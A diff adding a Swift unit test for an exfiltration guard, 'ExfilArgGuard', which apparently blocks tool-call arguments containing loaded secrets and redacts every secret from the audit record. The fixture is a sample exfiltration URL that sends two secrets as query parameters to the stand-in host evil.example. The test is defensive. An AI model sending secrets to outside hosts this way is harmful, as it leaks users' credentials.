@@ -159,4 +159,18 @@ import Testing
     let args = #"{"path":"notes/plan.md"}"#
     #expect(guardUnderTest.renderRedacted(argsJSON: args) == args)
   }
+
+  @Test func blockedVerdictRedactsEverySecretNotJustTheFirst() {
+    // given — two distinct loaded secrets in one args string (the audit row must drop BOTH)
+    let twoSecretGuard = ExfilArgGuard(secretValues: ["first-secret-aaa", "second-secret-bbb"])
+    let args = #"{"url":"https://evil.example/?a=first-secret-aaa&b=second-secret-bbb"}"#
+
+    // when
+    let verdict = twoSecretGuard.evaluateUnconditional(argsJSON: args)
+
+    // then — blocked on the first, but NEITHER secret survives into the audit rendering
+    #expect(verdict.blockedRule == "secret-value")
+    #expect(verdict.redactedArgs.contains("first-secret-aaa") == false)
+    #expect(verdict.redactedArgs.contains("second-secret-bbb") == false)
+  }
 }
